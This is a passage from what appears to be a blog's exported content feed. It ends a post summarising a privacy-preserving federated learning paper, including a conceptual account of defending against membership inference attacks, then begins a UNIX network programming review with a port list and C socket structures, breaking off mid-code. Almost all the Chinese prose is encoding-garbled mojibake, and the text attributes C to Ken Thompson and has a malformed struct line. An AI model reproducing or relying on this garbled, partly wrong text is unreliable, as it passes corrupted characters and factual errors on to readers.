id="ä¸ºäº†è¯æ˜å­é›†å’Œé—®é¢˜çš„å®éªŒæ•°æ®"><a href="#ä¸ºäº†è¯æ˜å­é›†å’Œé—®é¢˜çš„å®éªŒæ•°æ®" class="headerlink" title="ä¸ºäº†è¯æ˜å­é›†å’Œé—®é¢˜çš„å®éªŒæ•°æ®"></a>ä¸ºäº†è¯æ˜å­é›†å’Œé—®é¢˜çš„å®éªŒæ•°æ®</h4><p>åœ¨å®é™…æ•°æ®é›†ä¸­ï¼ŒæœªçŸ¥æ•°çš„æ•°é‡æ˜¯è¿œå¤§äºç­‰å¼çš„æ•°é‡çš„ï¼Œå…·ä½“çš„å®éªŒæƒ…å†µè§ä¸‹å›¾</p><img src="/2021/03/20/Transmission/table3.jpg" class="" title="table3"><h4 id="ä¸ºäº†å¢åŠ æ•°æ®é›†çš„è®­ç»ƒæ•ˆæœï¼Œæˆ‘ä»¬ä¼šå¯¹æ•°æ®é›†è¿›è¡Œæ‰©å¼ "><a href="#ä¸ºäº†å¢åŠ æ•°æ®é›†çš„è®­ç»ƒæ•ˆæœï¼Œæˆ‘ä»¬ä¼šå¯¹æ•°æ®é›†è¿›è¡Œæ‰©å¼ " class="headerlink" title="ä¸ºäº†å¢åŠ æ•°æ®é›†çš„è®­ç»ƒæ•ˆæœï¼Œæˆ‘ä»¬ä¼šå¯¹æ•°æ®é›†è¿›è¡Œæ‰©å¼ "></a>ä¸ºäº†å¢åŠ æ•°æ®é›†çš„è®­ç»ƒæ•ˆæœï¼Œæˆ‘ä»¬ä¼šå¯¹æ•°æ®é›†è¿›è¡Œæ‰©å¼ </h4><p>ä¾‹å¦‚å›¾ç‰‡ï¼šåˆ©ç”¨æ—‹è½¬ï¼Œè£å‰ªï¼Œç¿»è½¬ç­‰æ–¹æ³• , è¿‡æ‹Ÿåˆåé¢ä¼šè§£å†³</p><h4 id="å®é™…è®­ç»ƒä¸­ä½¿ç”¨äº†SGDçš„è¿›åŒ–ç‰ˆæœ¬"><a href="#å®é™…è®­ç»ƒä¸­ä½¿ç”¨äº†SGDçš„è¿›åŒ–ç‰ˆæœ¬" class="headerlink" title="å®é™…è®­ç»ƒä¸­ä½¿ç”¨äº†SGDçš„è¿›åŒ–ç‰ˆæœ¬"></a>å®é™…è®­ç»ƒä¸­ä½¿ç”¨äº†SGDçš„è¿›åŒ–ç‰ˆæœ¬</h4><p>ä¾‹å¦‚ ï¼šRMSProp [27] or Adam [28],</p><hr><h3 id="é¢„å®šä¹‰-additional-hedge"><a href="#é¢„å®šä¹‰-additional-hedge" class="headerlink" title="é¢„å®šä¹‰ additional hedge"></a>é¢„å®šä¹‰ additional hedge</h3><p>åŒæ—¶ä¸ºäº†ä½¿ç³»ç»Ÿæ›´å¥½çš„è¿›è¡Œï¼Œæˆ‘ä»¬è¿˜è¿›è¡Œäº†ä¸€äº›é¢„å®šä¹‰ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æ˜ç¡®æƒ³è¦è¾¾åˆ°å®Œç¾çš„ï¼Œæ²¡æœ‰æ³„éœ²çš„ç³»ç»Ÿæ˜¯ä¸å¯èƒ½çš„ã€‚æ–‡ä¸­å°†å…¶æè¿°ä¸ºDalenius desideratumï¼Œå³ç³»ç»Ÿå°†ä¼šè½¬åŒ–ä¸ºå®Œå…¨çš„éšæœºæ•°ä¼ è¾“ï¼Œè¿™æ˜¯æ²¡æœ‰ä¸æ¯«å®ç”¨æ€§çš„ã€‚</p><h4 id="å¢åŠ äº†å·®åˆ†éšç§å³æ·»åŠ å™ªå£°çš„æ–¹æ³•"><a href="#å¢åŠ äº†å·®åˆ†éšç§å³æ·»åŠ å™ªå£°çš„æ–¹æ³•" class="headerlink" title="å¢åŠ äº†å·®åˆ†éšç§å³æ·»åŠ å™ªå£°çš„æ–¹æ³•"></a>å¢åŠ äº†å·®åˆ†éšç§å³æ·»åŠ å™ªå£°çš„æ–¹æ³•</h4><p>ç”¨äºå¢åŠ éšç§æ€§,å…¶å®å°±æ˜¯åœ¨éšç§æ€§å’Œå‡†ç¡®æ€§ä¹‹é—´å¯»æ‰¾ä¸€ç§å¹³è¡¡</p><h4 id="åˆ©ç”¨Dropout-çš„æ–¹æ³•å¢åŠ å·®åˆ†éšç§å’Œé˜²æ­¢è¿‡æ‹Ÿåˆ"><a href="#åˆ©ç”¨Dropout-çš„æ–¹æ³•å¢åŠ å·®åˆ†éšç§å’Œé˜²æ­¢è¿‡æ‹Ÿåˆ" class="headerlink" title="åˆ©ç”¨Dropout çš„æ–¹æ³•å¢åŠ å·®åˆ†éšç§å’Œé˜²æ­¢è¿‡æ‹Ÿåˆ"></a>åˆ©ç”¨Dropout çš„æ–¹æ³•å¢åŠ å·®åˆ†éšç§å’Œé˜²æ­¢è¿‡æ‹Ÿåˆ</h4><p>Dropout çš„æ–¹æ³•ç”±ç¥ç»ç½‘ç»œé¢†åŸŸå¤§ç‰›Hinton 14å¹´æå‡ºï¼Œä¸»è¦åšæ³•æ˜¯åœ¨è®­ç»ƒæ—¶éšæœºéšè—ä¸€äº›ç»“ç‚¹ï¼Œè¿™æ ·èƒ½é™ä½ç»“ç‚¹é—´çš„ä¾èµ–æ€§ï¼ŒåŒæ—¶ä¹Ÿä¼šé™ä½å¯¹äºæ•°æ®çš„ä¾èµ–æ€§ã€‚</p><p><strong>ä¸¾ä¾‹</strong>æ¥è¯´ï¼Œæˆ‘ä»¬å°†ä¸€æ”¯å†›é˜Ÿåˆ†ä¸ºä¸‰éƒ¨åˆ†åˆ†åˆ«åœ¨æµ·é™†ç©ºè¿›è¡Œè®­ç»ƒï¼Œé‚£ä¹ˆä»–ä»¬æœ€åç»„åˆèµ·æ¥ç¯å¢ƒå¯¹äºä»–ä»¬å½±å“ä¼šå¾ˆå°ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠæ³•æ ¹æ®ä¸åŒç¯å¢ƒä»–ä»¬çš„ä½œæˆ˜è¡¨ç°åˆ¤æ–­ä»–ä»¬æ˜¯æµ·å†›ï¼Œé™†å†›è¿˜æ˜¯ç©ºå†›ã€‚</p><h4 id="ä½¿ç”¨åŒ¿åä¼ è¾“çš„æ–¹æ³•å¢å¼ºéšç§æ€§"><a href="#ä½¿ç”¨åŒ¿åä¼ è¾“çš„æ–¹æ³•å¢å¼ºéšç§æ€§" class="headerlink" title="ä½¿ç”¨åŒ¿åä¼ è¾“çš„æ–¹æ³•å¢å¼ºéšç§æ€§"></a>ä½¿ç”¨åŒ¿åä¼ è¾“çš„æ–¹æ³•å¢å¼ºéšç§æ€§</h4><p>æˆ‘ä»¬ä½¿ç”¨çš„å…·ä½“æ–¹æ³•ä¸ºï¼Œåœ¨ç”±serverè½¬å‘æ—¶éšè—æ•°æ®çš„æ¥æºï¼Œæˆ–è€…éšæœºä¼ è¾“ï¼Œå³ä¸€ä¸ªæ•°æ®å¯èƒ½æ¥è‡ªå°é›†åˆä¸­çš„ä»»ä¸€å…ƒç´ </p><h4 id="èµ‹äºˆæ¯ä¸ªç»“ç‚¹å½“å‘ç°é—®é¢˜å°±è¿›è¡Œé˜²å¾¡æ€§è¿›æ”»çš„æƒåŠ›ï¼ˆå³1ï¼Œ2ï¼Œ3ï¼‰"><a href="#èµ‹äºˆæ¯ä¸ªç»“ç‚¹å½“å‘ç°é—®é¢˜å°±è¿›è¡Œé˜²å¾¡æ€§è¿›æ”»çš„æƒåŠ›ï¼ˆå³1ï¼Œ2ï¼Œ3ï¼‰" class="headerlink" title="èµ‹äºˆæ¯ä¸ªç»“ç‚¹å½“å‘ç°é—®é¢˜å°±è¿›è¡Œé˜²å¾¡æ€§è¿›æ”»çš„æƒåŠ›ï¼ˆå³1ï¼Œ2ï¼Œ3ï¼‰"></a>èµ‹äºˆæ¯ä¸ªç»“ç‚¹å½“å‘ç°é—®é¢˜å°±è¿›è¡Œé˜²å¾¡æ€§è¿›æ”»çš„æƒåŠ›ï¼ˆå³1ï¼Œ2ï¼Œ3ï¼‰</h4><h4 id="å®é™…æ”»å‡»ä¸¾ä¾‹"><a href="#å®é™…æ”»å‡»ä¸¾ä¾‹" class="headerlink" title="å®é™…æ”»å‡»ä¸¾ä¾‹"></a>å®é™…æ”»å‡»ä¸¾ä¾‹</h4><p>æ–‡ä¸­è¿˜ç”¨å®é™…çš„æ”»å‡»è¿›è¡Œä¸¾ä¾‹ï¼Œè¯¥æ”»å‡»çš„ç›®çš„æ˜¯é€šè¿‡è·å–çš„ä¿¡æ¯æ‰¾åˆ°æ¨¡å‹ä¸Šä¸€è·³åœ¨å“ªä¸ªæ•°æ®é›†è®­ç»ƒçš„ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥åˆ©ç”¨1ï¼Œ2ï¼Œ4çš„æ–¹æ³•ç»¼åˆèµ·æ¥ï¼Œé˜²æ­¢è¿™ç§æ”»å‡»ã€‚å½“é¢ä¸´ä¸€ä¸ªæ›´å¼ºçš„å…·ä½“çš„æ”»å‡»æ—¶ï¼Œæ¯”å¦‚æˆå‘˜æ¨ç†æ”»å‡»ï¼Œæˆ‘ä»¬è¿™æ ·é˜²èŒƒã€‚</p><p>æˆå‘˜æ¨ç†æ”»å‡»çš„<strong>ç›®çš„</strong>æ˜¯ï¼šç»™å‡ºä¸€æ¡æ ·æœ¬ï¼Œå¯ä»¥æ¨æ–­è¯¥æ ·æœ¬æ˜¯å¦åœ¨æ¨¡å‹çš„è®­ç»ƒæ•°æ®é›†ä¸­â€”â€”å³ä¾¿å¯¹æ¨¡å‹çš„å‚æ•°ã€ç»“æ„çŸ¥ä¹‹ç”šå°‘ï¼Œè¯¥æ”»å‡»ä»ç„¶æœ‰æ•ˆ</p><p><strong>æœ¬è´¨</strong>æ˜¯ï¼šæ„å»ºä¸€ä¸ªäºŒåˆ†ç±»æ¨¡å‹ï¼Œä»¥X,Yä¸ºå‚æ•°ï¼Œåˆ¤æ–­è¯¥é¡¹æ˜¯å¦åœ¨æ•°æ®é›†ä¸­</p><p><strong>ä¸»è¦éƒ¨åˆ†</strong>æ˜¯ï¼šåˆ©ç”¨å½±å­æ¨¡å‹(shadow model)æ„å»ºä¸åŸç›®æ ‡æ¨¡å‹è®­ç»ƒé›†ç›¸ä¼¼çš„æ•°æ®é›†</p><p>æ–‡ä¸­ç»™å‡ºäº†ä¸‰ç§æ„å»ºå½±å­æ¨¡å‹çš„æ–¹æ³•ï¼š</p><p><strong>Model-based synthesisï¼š</strong> ç›´è§‚ä¸Šï¼Œå¦‚æœç›®æ ‡æ¨¡å‹ä»¥å¾ˆé«˜çš„æ¦‚ç‡ç»™å‡ºäº†æŸæ¡recordçš„ç±»åˆ«ï¼Œé‚£ä¹ˆè¯¥recordä¸ç›®æ ‡æ¨¡å‹è®­ç»ƒé›†ä¸­çš„æ•°æ®åº”è¯¥æ˜¯ååˆ†ç›¸ä¼¼çš„ã€‚æ‰€ä»¥ï¼Œå¯ä»¥ç”¨ç›®æ ‡æ¨¡å‹æœ¬èº«æ¥æ„å»ºå½±å­æ¨¡å‹çš„è®­ç»ƒæ•°æ®ï¼š</p><ul><li> æˆ‘ä»¬é€šè¿‡å·®åˆ†éšç§æ·»åŠ å™ªå£°çš„æ–¹æ³•ä½¿æ¦‚ç‡å¤„äºå˜åŒ–ä¸­ï¼ŒæŒ‘æˆ˜ä»–çš„é˜ˆå€¼</li></ul><p><strong>Statistics-based synthesisï¼š</strong> æ”»å‡»è€…çŸ¥é“ç›®æ ‡æ¨¡å‹è®­ç»ƒæ•°æ®çš„åˆ†å¸ƒä¿¡æ¯ï¼Œæ¯”å¦‚featureçš„è¾¹ç¼˜åˆ†å¸ƒï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ç”±åˆ†å¸ƒç”Ÿæˆæ•°æ®ã€‚</p><p><strong>Noisy real dataï¼š</strong> æ”»å‡»è€…ä¹Ÿè®¸å¯ä»¥è·å¾—å’Œç›®æ ‡æ¨¡å‹è®­ç»ƒé›†æ•°æ®ç›¸ä¼¼çš„æ•°æ®ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ç›®æ ‡æ¨¡å‹è®­ç»ƒé›†çš„å™ªå£°ç‰ˆæœ¬ï¼Œç›´æ¥åˆ©ç”¨ä¹‹</p><ul><li>å¯¹äºäºŒå’Œä¸‰æ–¹æ³•ï¼Œç”±äºæœ¬æ–‡çš„æ•°æ®é›†åªä¼šåœ¨æœ¬åœ°è¢«è®­ç»ƒï¼Œæ‰€ä»¥æ”»å‡»è€…æ—¢ä¸èƒ½å¾—åˆ°åˆ†å¸ƒä¹Ÿä¸èƒ½å¾—åˆ°å¸¦å™ªå£°çš„æ•°æ®ï¼Œå› æ­¤å¯ä»¥é˜²èŒƒè¿™ç§æ”»å‡»ã€‚</li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬ç‰‡æ–‡ç« äº®ç‚¹ä¸»è¦å°±æ˜¯<strong>æƒå€¼ä¼ è¾“</strong>ï¼Œå¹¶ä¸”çœŸçš„æ˜¯çµæ´»åˆ©ç”¨äº†è¿™ä¸ªå†…å®¹ï¼Œæˆ‘è§‰å¾—å®ƒä¸»è¦åšåˆ°äº†ä¸¤ä»¶äº‹</p><ul><li>é¦–å…ˆå®ƒè®©æ¯ä¸€ä¸ªç»“ç‚¹åœ¨ä¸€æ¬¡å¾ªç¯é‡Œæ‰§è¡Œå¤šæ¬¡è¿ç®—ï¼Œè¿™æ ·å°±æˆåŠŸå¼•å…¥äº†<strong>å­é›†å’Œé—®é¢˜</strong>ï¼Œç›¸å½“äºå¯¹äºæ¢¯åº¦çš„åŠ å¯†ä¹Ÿæ˜¯å¯¹äºæ•°æ®çš„äºŒæ¬¡åŠ å¯†</li><li>åˆ©ç”¨äº†æƒå€¼çš„é€’å½’æ€§ï¼Œè¿™æ ·å¯ä»¥å¯¹æƒå€¼è¿›è¡ŒåŠ å¯†ï¼Œä¸‹ä¸€ä¸ªtrainerå†è¿›è¡Œè§£å¯†åè®¡ç®—ï¼Œä¸­é—´çš„è½¬å‘è€…ä¸éœ€è¦çŸ¥é“<strong>å¯†é’¥</strong>ä¹Ÿä¸éœ€è¦çŸ¥é“å†…å®¹ï¼Œè¿™å¯èƒ½ä¹Ÿæ˜¯ä¸€ç§<strong>ç«¯åˆ°ç«¯</strong>å§</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> privacy-preserving </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNIX é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ </title>
      <link href="/2021/03/13/UNIX%20%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/03/13/UNIX%20%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦æ˜¯ UNIXé«˜çº§ç½‘ç»œç¼–ç¨‹ - å·ä¸€ çš„æ€»ç»“</p><a id="more"></a><h1 id="UNIX-é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ "><a href="#UNIX-é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ " class="headerlink" title="UNIX é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ "></a>UNIX é«˜çº§ç½‘ç»œç¼–ç¨‹å¤ä¹ </h1><h3 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h3><ol><li>è€ƒè‘—åçš„äººç‰©ï¼š <ol><li>cè¯­è¨€ä½œè€… ï¼Œ unix ä½œè€…ï¼š Ken Thompson (Dennis M. Ritchie)ï¼Œ </li><li>GNU åˆ›å»ºè€…/Emacs ä½œè€… Richard Matthew Stallman ï¼› </li><li>linux ä½œè€…ï¼šLinus Benedict Torvalds</li><li>vim ä½œè€…ï¼š Bram Moolenaar</li><li>Tex ä½œè€…ï¼š Donald Knuth é«˜å¾·çº³</li></ol></li></ol><h3 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h3><p>â€‹    TCP  çŠ¶æ€è½¬æ¢å›¾ ï¼Œ 2.9 å¸¸ç”¨çš„Port Number ï¼Œ2.10 Concurrent Server ï¼Œ 2.12 services</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">21ç«¯å£ï¼šFTP æ–‡ä»¶ä¼ è¾“æœåŠ¡</span><br><span class="line">22ç«¯å£ï¼šSSH ç«¯å£</span><br><span class="line">23ç«¯å£ï¼šTELNET ç»ˆç«¯ä»¿çœŸæœåŠ¡</span><br><span class="line">25ç«¯å£ï¼šSMTP ç®€å•é‚®ä»¶ä¼ è¾“æœåŠ¡</span><br><span class="line">53ç«¯å£ï¼šDNS åŸŸåè§£ææœåŠ¡</span><br><span class="line">80ç«¯å£ï¼šHTTP è¶…æ–‡æœ¬ä¼ è¾“æœåŠ¡</span><br><span class="line">110ç«¯å£ï¼šPOP3 â€œé‚®å±€åè®®ç‰ˆæœ¬3â€ä½¿ç”¨çš„ç«¯å£</span><br><span class="line">443ç«¯å£ï¼šHTTPS åŠ å¯†çš„è¶…æ–‡æœ¬ä¼ è¾“æœåŠ¡</span><br><span class="line">**********************************</span><br><span class="line">1433ç«¯å£ï¼šMS SQL*SERVERæ•°æ®åº“ é»˜è®¤ç«¯å£å·</span><br><span class="line">1521ç«¯å£ï¼šOracleæ•°æ®åº“æœåŠ¡</span><br><span class="line">1863ç«¯å£ï¼šMSN Messengerçš„æ–‡ä»¶ä¼ è¾“åŠŸèƒ½æ‰€ä½¿ç”¨çš„ç«¯å£</span><br><span class="line">3306ç«¯å£ï¼šMYSQL é»˜è®¤ç«¯å£å·</span><br><span class="line">3389ç«¯å£ï¼šMicrosoft RDP å¾®è½¯è¿œç¨‹æ¡Œé¢ä½¿ç”¨çš„ç«¯å£</span><br><span class="line">5631ç«¯å£ï¼šSymantec pcAnywhere è¿œç¨‹æ§åˆ¶æ•°æ®ä¼ è¾“æ—¶ä½¿ç”¨çš„ç«¯å£</span><br><span class="line">5632ç«¯å£ï¼šSymantec pcAnywhere ä¸»æ§ç«¯æ‰«æè¢«æ§ç«¯æ—¶ä½¿ç”¨çš„ç«¯å£</span><br><span class="line">5000ç«¯å£ï¼šMS SQL Serverä½¿ç”¨çš„ç«¯å£</span><br><span class="line">8000ç«¯å£ï¼šè…¾è®¯QQ</span><br></pre></td></tr></table></figure><h3 id="Chapter-3ï¼Œ4ï¼Œ5ï¼Œ6"><a href="#Chapter-3ï¼Œ4ï¼Œ5ï¼Œ6" class="headerlink" title="Chapter 3ï¼Œ4ï¼Œ5ï¼Œ6"></a>Chapter 3ï¼Œ4ï¼Œ5ï¼Œ6</h3><h4 id="Socket-Address-Structures"><a href="#Socket-Address-Structures" class="headerlink" title="Socket Address Structures"></a>Socket Address Structures</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line"><span class="keyword">in_addr_t</span> s_addr; <span class="comment">/* 32-bit IPv4 address */</span></span><br><span class="line">  <span class="comment">/* network byte ordered */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span> sin_len; <span class="comment">/* length of structure (16) */</span></span><br><span class="line"><span class="keyword">sa_family_t</span> sin_family; <span class="comment">/* AF_INET */</span></span><br><span class="line"><span class="keyword">in_port_t</span>sin_port; <span class="comment">/* 16-bit TCP or UDP port number */</span></span><br><span class="line"><span class="comment">/* network byte ordered */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>  <span class="title">sin_addr</span>;</span> <span class="comment">/* 32-bit IPv4 address */</span></span><br><span class="line"><span class="comment">/* network byte ordered */</span></span><br><span class="line"><span class="keyword">char</span> sin_zero[<span class="number">8</span>];<span class="comment">/* unused */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// IPV4</span></span><br><span class="line">inet_addr inet_ntoa</span><br><span class="line"><span class="comment">// IPV4/6</span></span><br><span class="line">inet_pton inet_ntop</span><br></pre></td></tr></table></figure><ul><li><code>in_addr</code> æ˜¯ç»“æ„çš„åŸå› æ˜¯æ—©æœŸå°†å…¶å®šä¹‰ä¸º <code>union</code> æ–¹ä¾¿<code>Aï¼ŒBï¼ŒC</code>ç±»åœ°å€çš„è®¿é—®</li><li><code>sin_zero</code> ç½®0</li></ul><h4 id="Generic-socket-address-structure"><a href="#Generic-socket-address-structure" class="headerlink" title="Generic socket address structure"></a>Generic socket address structure</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span> sa_len;</span><br><span class="line"><span class="keyword">sa_family_t</span> sa_family;  <span class="comment">/* address family: AF_xxx value */</span></span><br><span class="line"><span class="keyword">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* protocol-specific address */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ç”¨æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span>, struct sockaddr *, <span class="keyword">socklen_t</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span> <span class="comment">/* IPv4 socket address structure */</span></span><br><span class="line"><span class="comment">/* fill in serv&#123;&#125; */</span></span><br><span class="line">bind(sockfd, (struct sockaddr *) &amp;serv, <span class="keyword">sizeof</span>(serv));</span><br></pre></td></tr></table></figure><p>ç”¨äºå®šä¹‰å‡½æ•°æ—¶é€‚é…å„ç§ä¸åŒç±»å‹çš„åœ°å€ç»“æ„ï¼Œ</p><p>è‹¥ä¸è½¬æ¢ï¼Œç¼–è¯‘å™¨æŠ¥ <code>warning: passing arg 2 of &#39;bind&#39; from incompatible pointer type</code></p><h4 id="Sockaddr-in6"><a href="#Sockaddr-in6" class="headerlink" title="Sockaddr_in6"></a>Sockaddr_in6</h4><p>128-bits ipv6 åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span> s6_addr[<span class="number">16</span>]; <span class="comment">/* 128-bit IPv6 address */</span></span><br><span class="line"> <span class="comment">/* network byte ordered */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIN6_LEN  <span class="comment">/* required for compile-time tests */</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span> sin6_len; <span class="comment">/* length of this struct (28) */</span></span><br><span class="line"><span class="keyword">sa_family_t</span> sin6_family; <span class="comment">/* AF_INET6 */</span></span><br><span class="line"><span class="keyword">in_port_t</span> sin6_port; <span class="comment">/* transport layer port# */</span></span><br><span class="line"><span class="comment">/* network byte ordered */</span></span><br><span class="line"><span class="keyword">uint32_t</span> sin6_flowinfo;  <span class="comment">/* flow information, undefined */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span> <span class="comment">/* IPv6 address */</span></span><br><span class="line"><span class="comment">/* network byte ordered */</span></span><br><span class="line"><span class="keyword">uint32_t</span> sin6_scope_id;  <span class="comment">/* set of interfaces for a scope */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="Value-Result"><a href="#Value-Result" class="headerlink" title="Value-Result"></a>Value-Result</h4><p>å½“æˆ‘ä»¬æŠŠ SA* ä»ç”¨æˆ·è¿›ç¨‹ä¼ å…¥å†…æ ¸æ—¶é•¿åº¦ä½œä¸ºå€¼ value ï¼Œå†…æ ¸å¤„ç†å®Œè¿”å›æ—¶ç»“æ„çš„å¤§å°å¯èƒ½ä¼šæ”¹å˜ï¼Œå› æ­¤é•¿åº¦ä½œä¸ºä¸€ä¸ªç»“æœ result ä¼ å› , å¼•ç”¨æ˜¯å› ä¸ºéœ€è¦å‡½æ•°å†…éƒ¨å»èµ‹å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç”¨æˆ·è¿›ç¨‹ =&gt; å†…æ ¸</span></span><br><span class="line"><span class="comment">// bind connect sendto </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fill in serv&#123;&#125; */</span></span><br><span class="line">connect(sockfd, (SA *) &amp;serv, <span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†…æ ¸ =&gt; ç”¨æˆ·è¿›ç¨‹</span></span><br><span class="line"><span class="comment">// accept recvfrom getsockname getpeername </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">cli</span>;</span> <span class="comment">/* Unix domain */</span></span><br><span class="line"><span class="keyword">socklen_t</span> len;</span><br><span class="line"></span><br><span class="line">len = <span class="keyword">sizeof</span>(cli); <span class="comment">/* len is a value */</span></span><br><span class="line">getpeername(unixfd, (SA *) &amp;cli, &amp;len);</span><br><span class="line"><span class="comment">/* len may have changed */</span></span><br></pre></td></tr></table></figure><h4 id="å­—èŠ‚åº-Byte-Ordering"><a href="#å­—èŠ‚åº-Byte-Ordering" class="headerlink" title="å­—èŠ‚åº Byte Ordering"></a>å­—èŠ‚åº Byte Ordering</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å­—èŠ‚åºè½¬æ¢å‡½æ•°</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">htons</span><span class="params">(<span class="keyword">uint16_t</span> host16bitvalue)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htonl</span><span class="params">(<span class="keyword">uint32_t</span> host32bitvalue)</span></span>;</span><br><span class="line"> Both <span class="keyword">return</span>: value in network byte order</span><br><span class="line"><span class="keyword">uint16_t</span> ntohs(<span class="keyword">uint16_t</span> net16bitvalue);</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohl</span><span class="params">(<span class="keyword">uint32_t</span> net32bitvalue)</span></span>;</span><br><span class="line">Both <span class="keyword">return</span>: value in host byte order</span><br></pre></td></tr></table></figure><p>n - network ,  h  - host ,  s - short 16 ä½, l - long 32 ä½</p><h4 id="Byte-Manipulation"><a href="#Byte-Manipulation" class="headerlink" title="Byte Manipulation"></a>Byte Manipulation</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bzero</span><span class="params">(<span class="keyword">void</span> 